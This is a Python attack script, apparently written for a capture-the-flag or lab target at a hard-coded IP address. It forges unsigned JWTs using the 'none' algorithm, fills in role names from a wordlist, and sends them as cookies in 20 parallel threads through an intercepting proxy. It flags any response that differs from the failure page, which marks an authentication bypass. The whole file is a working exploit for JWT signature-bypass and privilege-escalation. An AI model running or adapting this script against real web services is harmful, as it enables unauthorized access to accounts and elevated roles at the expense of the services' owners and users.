import requests
import base64
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

# --- CONFIGURATION ---
TARGET_URL = "http://34.100.175.35:30302/"
WORDLIST_PATH = "roles.txt"
THREADS = 20  # Increased for speed
TIMEOUT = 5
FAIL_STRING = "No JWT provided"
FAIL_SIZE_BODY_BYTES = 10382
PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
USE_PROXIES = True

# Standard JWT Header for 'none' algorithm: {"alg":"none","typ":"JWT"}
JWT_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

def b64_encode(payload_dict):
    """Encodes dict to URL-safe Base64 without padding."""
    json_str = json.dumps(payload_dict, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.replace("=", "")

def test_role(role):
    role = role.strip()
    if not role:
        return None

    payload = {"sub": "anonymous", "role": role}
    payload_b64 = b64_encode(payload)
    jwt_token = f"{JWT_HEADER}.{payload_b64}."
    
    cookies = {"access_token_cookie": jwt_token}

    try:
        # follow redirect back to dashboard
        response = requests.get(TARGET_URL, cookies=cookies, timeout=TIMEOUT, allow_redirects=True, proxies=(PROXIES if USE_PROXIES else None))
        
        # Check if the "No JWT" error is gone or if we got a redirect/different status
        if (FAIL_STRING not in response.text) and (len(response.content) != FAIL_SIZE_BODY_BYTES) :
            return (True, role, jwt_token, response.status_code)
    except:
        pass
    
    return (False, role, None, None)

def main():
    try:
        with open(WORDLIST_PATH, 'r') as f:
            roles = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: '{WORDLIST_PATH}' not found.")
        return

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Launching {THREADS} threads...")

    hits = []
    
    # tqdm creates the real-time progress bar
    with tqdm(total=len(roles), unit="req", desc="Fuzzing Roles", colour="green") as pbar:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            # Submit all tasks
            future_to_role = {executor.submit(test_role, role): role for role in roles}
            
            for future in as_completed(future_to_role):
                result = future.result()
                if result and result[0]: # If it's a hit
                    hits.append(result)
                    # Use tqdm.write to prevent breaking the progress bar line
                    tqdm.write(f"\n[!] HIT FOUND! Role: {result[1]} | Status: {result[3]}")
                    tqdm.write(f"    Token: {result[2]}\n")
                
                pbar.update(1)

    print("\n[*] Fuzzing Complete.")
    if hits:
        print(f"[+] Total Hits Found: {len(hits)}")
        for h in hits:
            print(f"    - {h[1]} (Status: {h[3]})")
    else:
        print("[-] No valid roles found.")

if __name__ == "__main__":
    main()